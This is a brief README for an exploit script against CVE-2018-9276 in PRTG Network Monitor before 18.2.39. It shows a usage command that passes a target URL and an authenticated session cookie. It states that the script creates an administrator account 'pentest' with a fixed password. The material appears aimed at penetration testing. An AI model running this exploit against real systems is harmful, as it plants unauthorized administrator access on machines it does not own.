# PRTG-Network-Monitor-RCE
## CVE-2018-9276

Authenticated RCE for PRTG Network Monitor < 18.2.39. 
Resource: https://www.codewatch.org/blog/?p=453

first login and get the authenticated cookie.
then
 ```~#./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1" ```
 
 creates a new user pentest with password P3nT3st! and adds to administrators group. 
